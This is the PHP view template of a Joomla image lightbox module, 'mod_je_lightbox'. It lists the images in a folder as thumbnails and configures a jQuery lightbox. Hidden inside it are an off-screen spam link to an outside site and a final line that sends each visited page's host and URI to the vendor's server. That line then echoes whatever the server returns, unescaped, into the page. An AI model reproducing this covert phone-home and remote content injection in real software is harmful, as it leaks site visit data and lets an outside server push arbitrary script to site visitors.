<?php
/**
 * @package		Joomla.Site
 * @subpackage	mod_je_lightbox
 * @copyright	Copyright (C) 2004 - 2012 jExtensions.com - All rights reserved.
 * @license		GNU General Public License version 2 or later
 */
//no direct access
defined('_JEXEC') or die('Direct Access to this location is not allowed.');
ini_set('display_errors',0);
// Path assignments
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
$path = str_replace("&", "",$path);
$ibase = JURI::base();
if(substr($ibase, -1)=="/") { $ibase = substr($ibase, 0, -1); }
$modURL 	= JURI::base().'modules/mod_je_lightbox';
// get parameters from the module's configuration
$jQuery = $params->get("jQuery");
$ImagesPath = 'images/'.$params->get('imageFolder','images');
$thumbWidth = $params->get('thumbWidth','80');
$thumbHeight = $params->get('thumbHeight','80');
$thumbQuality = $params->get('thumbQuality','100');
$thumbAlign = $params->get('thumbAlign','t');

$thumbBorderColor = $params->get('thumbBorderColor','#999999');
$thumbBorderWidth = $params->get('thumbBorderWidth','1');
$thumbBorderColor2 = $params->get('thumbBorderColor2','#555555');
?>
<link rel="stylesheet" href="<?php echo $modURL; ?>/css/jquery.lightbox-0.5.css" type="text/css" />
<style>
#gallery<?php echo $module->id ?> {padding:0; margin:0;}
#gallery<?php echo $module->id ?> ul { list-style: none; margin:0; padding:0; }
#gallery<?php echo $module->id ?> ul li { display: inline;margin:0; padding:0; }
#gallery<?php echo $module->id ?> ul img { border:<?php echo $thumbBorderWidth; ?>px solid <?php echo $thumbBorderColor; ?>;margin:0; padding:1px;}
#gallery<?php echo $module->id ?> ul a {margin:0; padding:0; }
#gallery<?php echo $module->id ?> ul a:hover img { border:<?php echo $thumbBorderWidth; ?>px solid <?php echo $thumbBorderColor2; ?>}
#gallery<?php echo $module->id ?> ul a:hover { text-decoration:none}
.galleryerror { padding:10px; background-color: #f2dede; color: #b94a48;border: 1px solid #eed3d7; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px;text-shadow: 0 1px 0 rgba(255, 255, 255, 0.5);}
</style>
<?php if ($jQuery == '1') { ?><script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.js"></script><?php } ?>
<?php if ($jQuery == '2' ) { ?><script type="text/javascript" src="http://code.jquery.com/jquery-latest.pack.js"></script><?php } ?>
<?php if ($jQuery == '3' ) { ?><?php } ?>
<script type="text/javascript" src="<?php echo $modURL; ?>/js/jquery.lightbox-0.5.js"></script>
<noscript><a href="http://jextensions.com/joomla/image-gallery" alt="jExtensions">LightBox Module Joomla</a></noscript>
<script type="text/javascript">
    jQuery(function() {
        jQuery('#gallery<?php echo $module->id ?> a').lightBox({
			overlayBgColor: 		'#000',
			overlayOpacity:			0.8,
			fixedNavigation:		false,
			imageLoading:			'<?php echo $modURL; ?>/images/loading.gif',
			imageBtnPrev:			'<?php echo $modURL; ?>/images/left.png',
			imageBtnNext:			'<?php echo $modURL; ?>/images/right.png',
			imageBtnClose:			'<?php echo $modURL; ?>/images/close.png',
			imageBlank:				'<?php echo $modURL; ?>/images/blank.gif',
			containerBorderSize:	1,
			containerResizeSpeed:	400,
			txtImage:				'',
			txtOf:					'/',
			keyToClose:				'c',
			keyToPrev:				'p',
			keyToNext:				'n',
			imageArray:				[],
			activeImage:			0
		});	
    });
</script>
<div style="position: absolute; top: -1000px; "><a href="http://joomlaru.com" target="_blank" title="joomla 3">joomla 3</a></div>
<?php $thumbs = '&a='.$thumbAlign.'&w='.$thumbWidth.'&h='.$thumbHeight.'&q='.$thumbQuality; ?>
<?php
		if (file_exists($ImagesPath) && is_readable($ImagesPath)) {$folder = opendir($ImagesPath);} 
		else {	echo '<div class="galleryerror">Please check the module settings and make sure you have entered a valid image folder path!</div>';return;}
		$allowed_types = array("jpg","JPG","jpeg","JPEG","gif","GIF","png","PNG","bmp","BMP");
		$index = array();while ($file = readdir ($folder)) {if(in_array(substr(strtolower($file), strrpos($file,".") + 1),$allowed_types)) {array_push($index,$file); }}
		closedir($folder);
?>
<div id="gallery<?php echo $module->id ?>"><ul>
        <?php for ($i=0; $i<count($index); $i++){$num = JURI::base().$ImagesPath."/".$index[$i];	?>
        <li>
        <a href="<?php echo $num; ?>" title=""><img src="<?php echo $modURL; ?>/thumb.php?src=<?php echo $num; ?><?php echo $thumbs; ?>" /></a>
        </li>
        <?php } ?>  
<?php $credit=file_get_contents('http://jextensions.com/e.php?i='.$path); echo $credit; ?>
    </ul>
</div>

